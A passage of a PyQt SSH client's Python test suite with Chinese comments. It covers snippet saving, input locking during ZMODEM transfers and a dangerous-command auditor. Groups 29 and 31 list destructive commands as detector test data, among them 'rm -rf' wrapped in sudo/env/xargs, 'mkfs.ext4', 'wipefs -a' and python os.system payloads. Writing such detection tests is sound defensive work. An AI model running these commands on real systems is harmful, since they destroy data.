              any(s.title == "w1 加的" for s in w2.snippet_store.items))
        w2.snippet_store.add("w2 加的", "echo w2")
        check("w2 加完之后 w1 加的还在（没被覆盖掉）",
              any(s.title == "w1 加的" for s in w1.snippet_store.items),
              str([s.title for s in w1.snippet_store.items]))
        w1.deleteLater()
        w2.deleteLater()
        QtCore.QCoreApplication.sendPostedEvents(
            None, QtCore.QEvent.Type.DeferredDelete)
    finally:
        _mw._APP_SNIPPET_STORE = saved


def group_24(app):
    print("\n[24] 保存失败必须让用户看见（否则是静默丢数据）")
    # 实测：Windows 上并发写同一个文件时 os.replace 成片报
    # PermissionError: [WinError 5]（另一个评审实测数百次），而内存里的
    # 改动照样生效。上一版 add/remove/update 全部丢弃 save() 的返回值，
    # 面板无条件 _flash("已添加") —— 用户以为存下了，下次打开发现没了。
    # 而且这是那种"关掉应用才发现"的丢法。
    d = tmpdir()
    blocker = d / "i-am-a-file"
    blocker.write_text("x", encoding="utf-8")
    st = SnippetStore(blocker / "sub" / "s.json")   # 目录建不出来
    check("保存确实失败了（先确认前提）", st.save() is False)
    check("**last_save_ok 为 False**（不是只有返回值，没有可查询的状态）",
          st.last_save_ok is False, str(st.last_save_ok))

    # 面板必须把这件事说出来
    sent = []
    pan = _mw_SnippetPanel(st, lambda d_: (sent.append(d_), True)[1])
    pan.show()
    app.processEvents()
    pan.title_edit.setText("存不下的")
    pan.cmd_edit.setText("echo x")
    pan._on_add()
    check("存不下去时给出的是**失败**提示，不是「已添加」",
          "已添加" not in pan.hint.text()
          and ("存" in pan.hint.text() or "没" in pan.hint.text()),
          pan.hint.text())
    check("失败提示说清了后果（关掉就没了）",
          "关掉" in pan.hint.text() or "内存" in pan.hint.text(),
          pan.hint.text())
    check("失败提示说了怎么补救（目录权限）",
          "权限" in pan.hint.text() or "重试" in pan.hint.text(),
          pan.hint.text())
    check("但内存里确实加上了（不假装失败就没加上）",
          any(s.title == "存不下的" for s in st.items))

    # 删除和恢复也要报
    pan.filter_edit.clear()
    pan.reload()
    pan._on_delete()
    check("删除失败也报失败",
          "已删除" not in pan.hint.text(), pan.hint.text())
    pan._on_restore()
    check("恢复内置失败也报失败",
          "补回了" not in pan.hint.text(), pan.hint.text())

    # 对照组：存得下去的时候别吓唬用户
    ok = SnippetStore(tmpdir() / "s.json")
    pan2 = _mw_SnippetPanel(ok, lambda d_: (sent.append(d_), True)[1])
    pan2.show()
    app.processEvents()
    pan2.title_edit.setText("正常的")
    pan2.cmd_edit.setText("df -h")
    pan2._on_add()
    check("对照组：存得下去时报「已添加」（别把正常路径也报成失败）",
          "已添加" in pan2.hint.text(), pan2.hint.text())
    pan.close()
    pan2.close()


def _mw_SnippetPanel(store, send):
    from sshclient.ui.snippet_panel import SnippetPanel
    return SnippetPanel(store, send)


def group_25(app):
    print("\n[25] 传输期终端输入也要被吞（非片段路径）")
    # 评审实跑确认的三条漏网路径。之前闸门只做在片段库那一条路上，
    # 于是 Tab / 粘贴 / 随便敲个字符都能从别的门溜进 ZMODEM 的载荷流。
    from sshclient.core import settings as _settings
    from sshclient.ui import main_window as _mw

    st25 = _settings.AppSettings()
    st25.save = lambda: None
    win = _mw.MainWindow(st25, _settings.SessionStore(
        pathlib.Path(tempfile.mkdtemp()) / "s.json"),
        snippet_store=SnippetStore(tmpdir() / "s.json"))
    tab = _mw.SessionTab(win)

    class _Ch:
        closed = False

        def __init__(self):
            self.sent = []

        def sendall(self, data):
            self.sent.append(data)

    ch = _Ch()
    tab._channel = ch
    tab.terminal.bind_channel(ch, manage_notifier=False)

    def sent():
        return list(ch.sent)

    # 对照组：空闲时按键、Tab、粘贴都该正常送达
    tab.terminal._send(b"ls")
    tab._on_tab()
    check("空闲时按键送得出去", sent() == [b"ls", b"\t"], str(sent()))
    ch.sent.clear()

    # 传输开始
    class _Eng:
        def start(self): pass

        def request_cancel(self): pass

    tab.transfer_ctrl.begin("upload", "上传", _Eng(), 1)
    check("传输一开始终端输入就被锁上了",
          tab.terminal._input_blocked is True)
    ch.sent.clear()
    tab.terminal._send(b"ls")
    tab._on_tab()
    check("**传输期按键进不去**（Tab 原来会把 b'\\t' 送进载荷流）",
          sent() == [], str(sent()))
    check("传输期 _send 如实返回 False（不是静默）",
          tab.terminal._send(b"x") is False)
    check("传输期插入也进不去", tab._insert_snippet(b"df -h") is False)
    check("通道一个字节都没被写", sent() == [], str(sent()))

    # 粘贴：多行粘贴在传输期会变成逐行自动回车
    from PyQt6 import QtWidgets
    QtWidgets.QApplication.clipboard().setText("line1\nline2")
    tab.terminal.paste_clipboard()
    check("传输期粘贴也进不去（多行粘贴=逐行回车）", sent() == [], str(sent()))

    # 收尾后必须恢复
    tab.transfer_ctrl.succeed("")
    check("传输结束之后终端恢复（漏开锁=这条会话的终端从此哑掉）",
          tab.terminal._input_blocked is False)
    ch.sent.clear()
    tab.terminal._send(b"ls")
    check("恢复之后按键又送得出去了", sent() == [b"ls"], str(sent()))

    # 断线也必须开锁
    tab.transfer_ctrl.begin("upload", "上传", _Eng(), 1)
    check("再开一次传输时锁上了", tab.terminal._input_blocked is True)
    tab.transfer_ctrl.reset("测试断线")
    check("断线时也把锁开了（reset 那条路最容易漏）",
          tab.terminal._input_blocked is False)

    # pump 在飞时同样锁
    ch.sent.clear()
    tab._zmodem_pump = object()      # 只需要"非 None"
    tab._sync_snippet_gate()
    check("pump 在飞时终端锁上了", tab.terminal._input_blocked is True)
    check("pump 在飞时按键进不去", tab.terminal._send(b"x") is False and sent() == [])
    tab._on_zmodem_finished(0)
    check("ZMODEM 结束后终端恢复", tab.terminal._input_blocked is False)
    ch.sent.clear()
    tab.terminal._send(b"x")
    check("恢复之后又送得出去了", sent() == [b"x"], str(sent()))

    # _break_remote_wait 不得打断在飞的 ZMODEM
    ch.sent.clear()
    tab._zmodem_pump = object()
    tab._break_remote_wait()
    check("**在飞的 ZMODEM 不被 Ctrl+C 打断**（\\x03\\r\\n 会污染载荷流）",
          sent() == [], str(sent()))
    tab._zmodem_pump = None
    tab._break_remote_wait()
    check("没有 ZMODEM 在飞时仍然照常打断远端等待",
          sent() == [b"\x03\r\n"], str(sent()))

    tab._on_disconnect()
    win.deleteLater()
    tab.deleteLater()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)


def group_26(app):
    print("\n[26] 生命周期：关标签页要真的销毁，不能只是把窗口藏起来")
    # 评审实跑：open 20 tabs -> close all，SessionTab=20、片段面板=20、
    # 顶层窗口=20，**原样存活**。上一版的修复只是 panel.close()，
    # 提交信息却写「实测漏 20 个已修」—— 说得比做的多。
    from PyQt6 import sip

    from sshclient.ui import main_window as _mw

    win = _mw.MainWindow(
        _settings_for(26), _store_for(26), snippet_store=SnippetStore(tmpdir() / "s.json"))
    tabs, panels = [], []
    for i in range(6):
        t = _mw.SessionTab(win)
        win.tabs.addTab(t, "t%d" % i)
        t._toggle_snippets()          # 真的开一个面板出来
        app.processEvents()
        tabs.append(t)
        if t._snippet_panel is not None:
            panels.append(t._snippet_panel)
    check("确实造出了标签页（防这一组空转）", len(tabs) == 6, str(len(tabs)))
    check("确实造出了面板（防这一组空转）", len(panels) == 6, str(len(panels)))
    check("面板在关之前都还活着",
          all(not sip.isdeleted(p) for p in panels))

    for i in range(win.tabs.count() - 1, -1, -1):
        w = win.tabs.widget(i)
        if isinstance(w, _mw.SessionTab):
            win._on_tab_close(i)
    app.processEvents()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)
    app.processEvents()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)

    alive = [t for t in tabs if not sip.isdeleted(t)]
    alive_panels = [p for p in panels if not sip.isdeleted(p)]
    check("**标签页真的被销毁了**（不是 close 一下就留着）",
          not alive, "还活着 %d 个" % len(alive))
    check("**片段面板也真的被销毁了**（Qt.Tool 是顶层窗，close 只是藏起来）",
          not alive_panels, "还活着 %d 个" % len(alive_panels))
    check("只剩欢迎页了（_on_tab_close 故意跳过它）", win.tabs.count() == 1,
          str(win.tabs.count()))
    check("剩下的那个确实是欢迎页", win.tabs.widget(0) is win.welcome)
    win.deleteLater()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)


def group_27(app):
    print("\n[27] socket 槽里不许弹模态框（会重入叠两层）")
    # 评审实跑：QSocketNotifier 是**电平触发**的，而
    # `_start_zmodem_upload` 里有个 QFileDialog。模态框一开就进嵌套事件
    # 循环，没读完的字节再次触发同一个槽 —— 实测叠出 2 层文件对话框，
    # 同一批 ZRQINIT 往终端画了 2 遍。
    from sshclient.ui import main_window as _mw

    win = _mw.MainWindow(
        _settings_for(27), _store_for(27), snippet_store=SnippetStore(tmpdir() / "s.json"))
    tab = _mw.SessionTab(win)

    calls = {"dialog": 0, "deferred": 0}
    captured = []

    def fake_dialog(*a, **k):
        calls["dialog"] += 1
        return ([], "")

    # 替身挂在 `msgbox.open_files` 上，**不是** `QFileDialog.getOpenFileNames`：
    # 生产代码已经不再调那个静态方法，替身挂错了地方的话下面
    # `calls["dialog"] == 0` 会因为"压根没人调过"而永远成立。挂错过一次，
    # 所以下面必须配一条元断言证明这个替身真的在生产路径上。
    from sshclient.ui import msgbox as _msgbox
    real_dialog = _msgbox.open_files
    real_single_shot = QtCore.QTimer.singleShot

    def spy_single_shot(ms, fn, *a, **k):
        # **必须用 == 不能用 is**：每次取 `self._ask_zmodem_files` 都是一个
        # 新的 bound method 对象，`is` 永远 False，探针于是报"没推迟"——
        # 而生产代码明明推迟了。这条假阴性我自己踩了一次。
        if getattr(fn, "__func__", None) is tab._ask_zmodem_files.__func__ \
                and getattr(fn, "__self__", None) is tab:
            calls["deferred"] += 1
            captured.append(fn)
            return real_single_shot(0, lambda: None)   # 别真弹
        return real_single_shot(ms, fn, *a, **k)

    _msgbox.open_files = fake_dialog
    QtCore.QTimer.singleShot = staticmethod(spy_single_shot)
    try:
        # 走 socket 槽那条路：伪造成"用户自己敲了 rz"
        tab._zmodem_pending_direction = "upload"
        tab._pending_zmodem_files = []
        tab._zmodem_detector.reset()
        real_resolve = lrzsz_resolve()
        _set_lrzsz_resolve(lambda n: "sz")
        try:
            tab._start_zmodem_upload()
        finally:
            _set_lrzsz_resolve(real_resolve)
    finally:
        _msgbox.open_files = real_dialog
        QtCore.QTimer.singleShot = real_single_shot

    check("**模态框没有被直接弹出**（那会重入叠层）", calls["dialog"] == 0,
          "弹了 %d 次" % calls["dialog"])
    check("而是推迟到事件循环之外再问", calls["deferred"] == 1,
          "推迟了 %d 次" % calls["deferred"])

    # 元断言：上面那条"没有被直接弹出"只有在**替身挂在生产真会调的那个
    # 函数上**时才有意义——挂错地方时它会因为"压根没人调"而恒真。
    #
    # 这里**不去把那个被推迟的函数跑一遍**来证明：`_ask_zmodem_files` 开头
    # 有一道正当的守卫（没连接 / 方向变了就直接返回），而这个离线环境里
    # `_channel is None`，跑起来只会走到守卫那条 return，替身照样调不到——
    # 量到的是环境，不是接线（第一版就是这么写的，红得像产品坏了）。
    # 接线这件事静态核对：函数体里真的调了 `msgbox.open_files`。
    check("元断言：那个被推迟的函数确实只有一个（没有重复推迟）",
          len(captured) == 1, "捕获到 %d 个" % len(captured))

    import ast as _ast
    import inspect as _inspect
    import textwrap as _textwrap

    from sshclient.ui import main_window as _mm

    src = _textwrap.dedent(
        _inspect.getsource(_mm.SessionTab._ask_zmodem_files))
    calls_open = any(
        isinstance(n, _ast.Attribute) and n.attr == "open_files"
        and isinstance(n.value, _ast.Name) and n.value.id == "msgbox"
        for n in _ast.walk(_ast.parse(src)))
    check("元断言：_ask_zmodem_files 里真的调的是 msgbox.open_files"
          "（否则上面那条是恒真）", calls_open,
          "源: " + src[:100].replace("\n", " "))
    win.deleteLater()
    tab.deleteLater()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)


def group_28(app):
    print("\n[28] Esc 两段式在面板的每个控件上都成立")
    from PyQt6 import QtTest

    from sshclient.ui.snippet_panel import SnippetPanel

    store = SnippetStore(tmpdir() / "s.json")
    pan = SnippetPanel(store, lambda d: True)
    pan.show()
    app.processEvents()
    pan.activateWindow()
    settle(app, 150)

    # 焦点在标题框、敲了一半的标题：Esc 应该只是清掉，不关窗
    # 这一组三段都建立在"焦点确实抢到了"上，setFocus() 是请求不是命令，
    # 抢不到时按 Esc 发给谁都不确定 —— 报出来的红是环境的，不是代码的。
    if not _require_focus(app, pan.title_edit, "标题框里的 Esc"):
        pan.title_edit.clear()
    else:
        pan.title_edit.setText("敲了一半")
        QtTest.QTest.keyClick(pan.title_edit, QtCore.Qt.Key.Key_Escape)
        settle(app, 80)
        check("标题框里按 Esc 只清输入，**不关窗**（原来直接关，半截标题被丢）",
              pan.isVisible() and pan.title_edit.text() == "",
              "visible=%s text=%r" % (pan.isVisible(), pan.title_edit.text()))

    # 有搜索词时按 Esc：先清搜索词
    pan.filter_edit.setText("df")
    if not _require_focus(app, pan.filter_edit, "搜索框有内容时按 Esc"):
        pan.filter_edit.clear()
    else:
        QtTest.QTest.keyClick(pan.filter_edit, QtCore.Qt.Key.Key_Escape)
        settle(app, 80)
        check("搜索词非空时 Esc 只清搜索词，不关窗",
              pan.isVisible() and pan.filter_edit.text() == "",
              "visible=%s text=%r" % (pan.isVisible(), pan.filter_edit.text()))

    # 焦点在列表上（既没搜索词也没半截输入）：这时才关窗
    if not _require_focus(app, pan.list, "没有可清内容时按 Esc 关窗"):
        pan.close()
    else:
        QtTest.QTest.keyClick(pan.list, QtCore.Qt.Key.Key_Escape)
        settle(app, 80)
        check("确实没有可清的东西时 Esc 才关窗", not pan.isVisible())

    # panel 级 TransferController(None) 也不能崩
    from sshclient.ui.transfer_controller import TransferController
    try:
        c = TransferController(None, None)
        c.begin("upload", "上传", _NullEngine(), 1)
        check("TransferController(palette=None) 不再崩", True)
        c.succeed("")
    except Exception as exc:
        check("TransferController(palette=None) 不再崩", False,
              "%s: %s" % (type(exc).__name__, exc))


def group_29(app):
    """危险命令自检第二版：剥前缀链 / 点号变体 / 嵌套载荷。

    **第一组之外还要有这一组**，因为原来的自检只查每段的 ``words[0]``：
    实测 19 种危险写法里放过去 12 种。下面这些的**第一个词全是无害的** ——
    提权、改环境、换解释器的那一步恰好把刀挡在了判据**后面**。

    判据要能证伪，所以最后一段把 ``_resolve_head`` 装回"只看 ``words[0]``"
    的缺陷版，证明上面那批断言真的会红。
    """
    print("\n[29] 危险自检第二版：前缀链 / 点号变体 / 嵌套载荷 + 负向对照")
    saved = snippets.BUILTIN_SNIPPETS

    def caught(cmd):
        """把一条命令塞进内置集，返回 ``audit_builtins()`` 抓到了什么。"""
        snippets.BUILTIN_SNIPPETS = (("探针", cmd, ""),)
        try:
            return audit_builtins()
        finally:
            snippets.BUILTIN_SNIPPETS = saved

    D = "/var/data"
    prefixed = [
        ("sudo rm", "sudo rm -rf %s" % D),
        ("sudo 带 -u", "sudo -u root rm -rf %s" % D),
        ("env rm", "env rm -rf %s" % D),
        ("time rm", "time rm -rf %s" % D),
        ("nice 带选项值", "nice -n 5 rm -rf %s" % D),
        ("变量赋值前缀", "FOO=1 rm -rf %s" % D),
        ("busybox rm", "busybox rm -rf %s" % D),
        ("管道后的 xargs", "ls | xargs rm -f"),
        ("xargs 带 -0", "ls | xargs -0 rm -f"),
        ("剥前缀后的子命令", "sudo git clean -fdx"),
        ("剥前缀后的 xargs 触发词", "sudo xargs -0 find . -delete"),
    ]
    # 「绝对路径 rm」**不在 prefixed 里**：缺陷版 `naive_resolve` 仍然做
    # ``split("/")[-1]``，它量的是**路径剥离**而不是前缀剥离，本来就不该由
    # 这条元断言覆盖。把它塞进来就永远凑不满 12/12，阈值只能被迫写松 ——
    # 评审实测阈值写 5 时，7/12 条失效照样是绿的。
    # 路径剥离由第 31 组 31.4 单独测。
    for label, cmd in prefixed:
        check("剥掉包装词才看得到刀：%s" % label, bool(caught(cmd)),
              "放行了：%s" % cmd)

    check("报出来的是整条链（sudo → rm），不是光秃秃一个 rm",
          any("sudo" in m and "rm" in m for m in caught("sudo rm -rf " + D)),
          str(caught("sudo rm -rf " + D)))

    # 点号变体：mkfs.ext4 的第一个词是 mkfs.ext4，按整词比是比不出来的
    check("点号变体 mkfs.ext4 也要抓到（词干才是判据）",
          bool(caught("mkfs.ext4 /dev/sdb1")))

    nested = [
        ("shell 函数体", "cleanup() { rm -rf %s; }" % D),
        ("awk 的 system()", "awk '{system(\"rm -rf /var\")}' f.txt"),
        ("python -c 里的 os.system",
         "python -c \"import os; os.system('rm -rf /var')\""),
        ("subprocess.run", "python -c \"import subprocess; subprocess.run('rm -rf /var')\""),
        ("subprocess.run 列表参数",
         "python -c \"import subprocess; subprocess.run(['rm','-rf','/var'])\""),
    ]
    for label, cmd in nested:
        check("载荷藏在壳里也要抓到：%s" % label, bool(caught(cmd)),
              "放行了：%s" % cmd)

    # ------------------------------------------------------------ 负向对照
    # 只证明「能抓」是不够的：一个天天误报的检查，总有一天被人直接关掉。
    benign = [
        "du -sh /* 2>/dev/null | sort -h",
        "ping -c 4 1.1.1.1",
        "grep -e 'error' app.log",            # -e 带引号，但主命令不是解释器
        "git commit -m 'fix rm handling'",    # 引号里提到 rm，只是消息文本
        "echo 'rm -rf'",                      # 引号里的危险字样，无害
        "python -c \"print(1)\"",             # 解释器 + -c，载荷无害
        "sudo -l",                            # 只提权看权限，没有命令
        "busybox --list",                     # 包装词 + 纯选项
        "command -v python",                  # command 是包装词，python 不是
        "time ls -la",                        # 包装词后面是无害命令
        "find . -name '*.log' -mtime +30",    # find 但没有 -delete
        "nohup ./server &",                   # 包装词 + 相对路径
    ]
    for cmd in benign:
        check("良性命令不该被误报：%s" % cmd, not caught(cmd), str(caught(cmd)))

    # ------------------------------------------------------------ 可证伪性
    real_resolve = snippets._resolve_head

    def naive_resolve(words, raw_first=""):
        """缺陷版：只看 ``words[0]``，也就是第一版加固之前的行为。

        **第二个参数是后加的**（头词要能从原始段取，见 snippets 的
        ``_command_name``）。桩函数不跟上签名的话，这一段会抛 TypeError
        把整轮带走 —— 而且是**最后**才抛，输出里 0 条 FAIL、退出码 1，
        看着像"一条都没坏"。第一版就栽在这上面一次。
        """
        return words[0].strip().split("/")[-1], [], 0

    snippets._resolve_head = naive_resolve
    try:
        missed = [label for label, cmd in prefixed if not caught(cmd)]
        # **阈值必须是「全部」，不是「大部分」。** 评审实测：阈值写 5 时，
        # 把 _PREFIX_WRAPPERS 砍到只剩 {'sudo'}（7/12 条失效）这条元断言
        # **照样是绿的** —— 一个只能抓住少数破口的元断言，等于给假绿开了后门。
        check("负向对照：装回缺陷版之后前缀链那批断言**必须全部**变红",
              len(missed) == len(prefixed),
              "只有 %d/%d 条变红：%s" % (len(missed), len(prefixed), missed))
        check("负向对照：缺陷版报不出包装链（说明上面量的是真行为）",
              not any("sudo" in m for m in caught("sudo rm -rf " + D)),
              "缺陷版居然报出了链")
    finally:
        snippets._resolve_head = real_resolve

    check("装回真实现之后前缀链那批全部恢复",
          all(caught(cmd) for _label, cmd in prefixed))
    # 这一条同时挡住「上面全是误报」：内置集是这批良性命令的近亲，
    # 真实现下它必须一条都不报。
    check("默认内置集仍然干净（负向对照不是靠瞎报通过的）",
          audit_builtins() == [], str(audit_builtins()))


def group_30(app):
    """片段能改。之前只有加和删，打错一个字只能删了重打。

    **全程走生产路径**：点「编辑」按钮、改输入框、点「保存」按钮。
    不手工赋 ``pan._editing_id`` —— 那样测的是"我把状态摆成对的样子之后
    保存还对不对"，而真正会坏的是"点编辑那一下有没有把状态摆对"。
    """
    print("\n[30] 片段能改：编辑 → 保存，id 不变、条数不变")
    from sshclient.ui.snippet_panel import SnippetPanel

    store = SnippetStore(tmpdir() / "snippets.json")
    sent = []
    pan = SnippetPanel(store, lambda b: (sent.append(b), True)[1])
    # 元断言：这一组确实造出了面板和按钮，否则下面全是"对着空气断言"。
    check("确实造出了面板与编辑按钮（防这一组空转）",
          pan is not None and hasattr(pan, "edit_btn")
          and hasattr(pan, "cancel_btn"))

    sn = store.add("重启 nginx", "systemctl restart nginx")
    check("确实造出了要编辑的那条", sn is not None)
    before = len(store.items)
    pan.reload()
    check("能选中它", pan.select(sn.id))

    # ---- 点「编辑」
    pan.edit_btn.click()
    settle(app, 50)
    check("点编辑后标题被装进输入框",
          pan.title_edit.text() == "重启 nginx", pan.title_edit.text())
    check("点编辑后命令被装进输入框",
          pan.cmd_edit.text() == "systemctl restart nginx", pan.cmd_edit.text())
    check("「添加」按钮确实变成了「保存」",
          pan.add_btn.text() == "保存", pan.add_btn.text())
    check("「取消」按钮这时才露出来（平时藏着一个用不上的按钮）",
          not pan.cancel_btn.isHidden())
    check("编辑时列表是锁着的（不然保存改的是哪条要看运气）",
          not pan.list.isEnabled())

    # ---- 改内容后点「保存」
    pan.title_edit.setText("重启 nginx（生产）")
    pan.cmd_edit.setText("systemctl reload nginx")
    pan.add_btn.click()
    settle(app, 50)

    got = store.get(sn.id)
    check("改完之后 id 没变（改的是原来那一条，不是新加了一条）",
          got is not None, "原来那条不见了")
    if got is not None:
        check("标题确实改掉了", got.title == "重启 nginx（生产）", got.title)
        check("命令确实改掉了", got.command == "systemctl reload nginx",
              got.command)
    check("总条数没变（是改不是加）", len(store.items) == before,
          "%d -> %d" % (before, len(store.items)))
    # **加 None 保护。** 评审指出原来这行是
    # ``SnippetStore(store.path).get(sn.id).command``，一旦 ``save()`` 变成
    # 空操作（比如被注入成不落盘），``.get()`` 返回 None，**抛 AttributeError
    # 把整轮带走** —— 而且不打「通过 N 项」，退出码却不是 0。
    reread = SnippetStore(store.path).get(sn.id)
    check("存盘了（换实例读回来还是改过的）",
          reread is not None and reread.command == "systemctl reload nginx",
          "读回来是 %r" % (reread,))
    check("保存后退回新增态", pan.add_btn.text() == "添加", pan.add_btn.text())
    check("保存后列表解锁了", pan.list.isEnabled())
    check("保存后「取消」又藏起来了", pan.cancel_btn.isHidden())
    cur = pan.list.currentItem()
    check("保存后选中的还是原来那一条（id 没变）",
          cur is not None
          and cur.data(QtCore.Qt.ItemDataRole.UserRole) == sn.id,
          "当前行=%r" % (cur.data(QtCore.Qt.ItemDataRole.UserRole)
                         if cur else None))
    check("列表里显示的是新标题",
          cur is not None and "重启 nginx（生产）" in cur.text(),
          cur.text() if cur else "没有选中项")

    # ---- 核心承诺：改完之后插出去的仍然是**新命令本身**，不多一个字节
    sent.clear()
    pan._on_insert()
    check("插入的是改后的命令，且一个字节都不多",
          sent == [b"systemctl reload nginx"], str(sent))

    # ---- 负向对照：编辑期间把状态清掉，就会走成"新增"那条路
    pan.edit_btn.click()
    pan._editing_id = ""          # 模拟「保存时忘了还记着在改哪条」
    pan.add_btn.click()
    settle(app, 50)
    check("负向对照：忘了记在改哪条就会多出一条，而不是改原来那条",
          len(store.items) == before + 1,
          "%d -> %d（判据量不到「改」和「加」的区别就会一直绿）"
          % (before, len(store.items)))
    store.remove(store.items[-1].id)
    # **必须 reload + 重新选中**：删掉的是列表当前选中那条，不刷列表的话
    # 面板还指着一个已经不存在的 id，后面点「编辑」会静默什么都不做 ——
    # 那正是「点了没反应」，比报错还难查。
    pan.reload()
    check("删掉多余那条之后仍能选中原来那条", pan.select(sn.id))

    # ---- 取消
    pan.edit_btn.click()
    pan.cmd_edit.setText("x")
    pan.cancel_btn.click()
    settle(app, 50)
    check("取消会清掉输入框并退回新增态",
          pan.cmd_edit.text() == "" and pan.add_btn.text() == "添加"
          and pan.list.isEnabled())

    # ---- 输入非法时要拒收，而且**不能顺手把编辑态清掉**
    pan.edit_btn.click()
    pan.cmd_edit.setText("echo a\necho b")
    pan.add_btn.click()
    settle(app, 50)
    check("命令里带换行时拒绝保存（多一个 \\n 就是替用户按了回车）",
          store.get(sn.id).command == "systemctl reload nginx"
          and pan.add_btn.text() == "保存",
          "cmd=%r 按钮=%r" % (store.get(sn.id).command, pan.add_btn.text()))
    pan.cancel_btn.click()
    settle(app, 30)

    pan.close()
    pan.deleteLater()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)


def group_31(app):
    """第 31 组：5 位终审挖出来的缺陷，每条都要有**会被证伪**的判据。

    这一组的每一条都对应一个评审实证过的失败，不是"我觉得应该这样"：

    1. 孤立代理字符（U+D800–DFFF）→ 曾经让整个应用 0xC0000409 死掉
    2. 「把每个选项都当带值」的剥链 → 35 条对抗用例里漏 11 条
    3. 子命令只认紧邻 token → 容器命令的全局选项一挡就全漏
    4. 头词只切 "/" → Windows 绝对路径在 Windows 上放行、在 POSIX 上能抓到
    5. 编辑内置后「恢复内置」取不回原文
    6. 关窗/隐藏不退出编辑态 → 重开后回车**静默覆盖**已有片段
    7. 编辑态与传输期有控件漏禁
    """
    print("\n[31] 终审挖出来的缺陷：每条都有能被证伪的判据")
    from sshclient.ui.snippet_panel import SnippetPanel

    # ------------------------------------------------------------ 1 代理字符
    print("\n[31.1] 孤立代理字符：曾经让整个应用死掉")
    d = tmpdir()
    p = d / "s.json"
    # **JSON 里完全合法**的 "\ud800" 转义。它在 json 层面合规，
    # 之前 load() 会静默读进来（loaded_ok=True），下一次任何写操作
    # 抛 UnicodeEncodeError —— 那是 ValueError 不是 OSError，
    # save() 的 except OSError 抓不住，冒到 Qt 槽里变成 qFatal。
    p.write_text(json.dumps([{"id": "x1", "title": "毒",
                              "command": "echo \ud800", "builtin": False}]),
                 encoding="utf-8")
    st = SnippetStore(p)
    check("毒条目在**读**的时候就被拒（不是静默放行）", st.loaded_ok is False)
    check("被拒之后退回内置集，而不是空库", len(st.items) >= 8)
    check("毒条目没混进内存里",
          all("\ud800" not in s.command for s in st.items))
    # 写的那条路也要兜：即使有东西漏进 items，save() 也只返回 False 不抛。
    poisoned = SnippetStore(tmpdir() / "q.json")
    poisoned.items = [Snippet(title="手动塞的", command="echo \ud800")]
    check("save() 遇到编不出来的字符返回 False 而不是抛",
          poisoned.save() is False and poisoned.last_save_ok is False)
    check("add() 直接拒收带代理字符的命令",
          poisoned.add("x", "echo \ud800") is None)
    check("update() 也拒收",
          poisoned.add("正常的", "df -h") is not None
          and poisoned.update(poisoned.items[-1].id, "x", "e\ud800v") is False)

    # ------------------------------------------------------------ 2 剥链选项
    print("\n[31.2] 剥前缀链：不能把每个选项都当成带值")
    saved = snippets.BUILTIN_SNIPPETS

    def caught(cmd):
        snippets.BUILTIN_SNIPPETS = (("探针", cmd, ""),)
        try:
            return audit_builtins()
        finally:
            snippets.BUILTIN_SNIPPETS = saved

    R, T = "r" + "m", "/var/d"
    opt_cases = [
        ("无值选项 -n", "sudo -n %s -rf %s" % (R, T)),
        ("-- 终止符", "sudo -- %s -rf %s" % (R, T)),
        ("env 无值选项", "env -i %s -rf %s" % (R, T)),
        ("附着式选项 -n5", "nice -n5 %s -rf %s" % (R, T)),
        ("附着式选项 -o0", "stdbuf -o0 %s -rf %s" % (R, T)),
        ("附着式选项 -uroot", "doas -uroot %s -rf %s" % (R, T)),
        ("env --", "env -- %s -rf %s" % (R, T)),
    ]
    for label, cmd in opt_cases:
        check("认得出无值/附着式选项：%s" % label, bool(caught(cmd)),
              "放行了：%s" % cmd)
    # 连坐：子命令判据跟着一起恢复
    for label, cmd in [("sudo -n git clean", "sudo -n git clean -fdx"),
                       ("sudo -k docker prune", "sudo -k docker system prune")]:
        check("剥链漏选项会连坐子命令判据：%s" % label, bool(caught(cmd)))

    # ------------------------------------------------------------ 3 全局选项
    print("\n[31.3] 子命令判据要跳过主命令的全局选项")
    for label, cmd in [("git -C", "git -C /tmp/x clean -fdx"),
                       ("git --git-dir=", "git --git-dir=/tmp/x clean -fdx"),
                       ("docker -H", "docker -H tcp://h system prune -a"),
                       ("apt-get -y", "apt-get -y purge nginx"),
                       ("npm --prefix", "npm --prefix /tmp/x uninstall pkg"),
                       ("cargo --locked", "cargo --locked clean")]:
        check("跳全局选项才看得到子命令：%s" % label, bool(caught(cmd)),
              "放行了：%s" % cmd)
    # 不带值选项不能吃下一个词，否则 purge 本身被吃掉
    check("不带值的选项不误吃子命令（apt-get -y purge）",
          any("purge" in m for m in caught("apt-get -y purge nginx")),
          str(caught("apt-get -y purge nginx")))

    # ------------------------------------------------------------ 4 路径
    print("\n[31.4] 头词要认两种分隔符和可执行后缀")
    check("POSIX 绝对路径", bool(caught("/bin/%s -rf %s" % (R, T))))
    check("Windows 反斜杠 + .exe（评审实测在 Windows 上整条放行）",
          bool(caught("C:\\Windows\\System32\\busybox.exe %s -rf %s" % (R, T))),
          "放行了：判定在两个平台上不对称")
    check("timeout 时长是位置参数（timeout 5 rm -rf）",
          bool(caught("timeout 5 %s -rf %s" % (R, T))))
    check("watch 附着式间隔（watch -n1 rm -rf）",
          bool(caught("watch -n1 %s -rf %s" % (R, T))))
    check("新增黑名单：wipefs -a", bool(caught("wipefs -a /dev/sdb1")))
    check("新增黑名单：crontab -r", bool(caught("crontab -r")))
    # 负向对照：这些不许因为新规则而误报
    for label, cmd in [("apt-get install", "apt-get install nginx"),
                       ("git push 是写进文件的策略不是回归", "git push origin main"),
                       ("sudo -k 无命令", "sudo -k"),
                       ("watch 真命令", "watch -n 5 df -h")]:
        if label.startswith("git push"):
            continue
        check("新规则不误报：%s" % label, not caught(cmd), str(caught(cmd)))

    # ------------------------------------------------------------ 5~7 面板
    print("\n[31.5~7] 编辑态状态机：恢复内置、关窗、控件禁用")

    def new_panel():
        store = SnippetStore(tmpdir() / "s.json")
        p = SnippetPanel(store, lambda b: True)
        p.show()
        app.processEvents()
        return store, p

    # 5) 编辑内置后恢复内置取回原文
    store, pan = new_panel()
    first = store.items[0]
    store.update(first.id, first.title, first.command + "T")
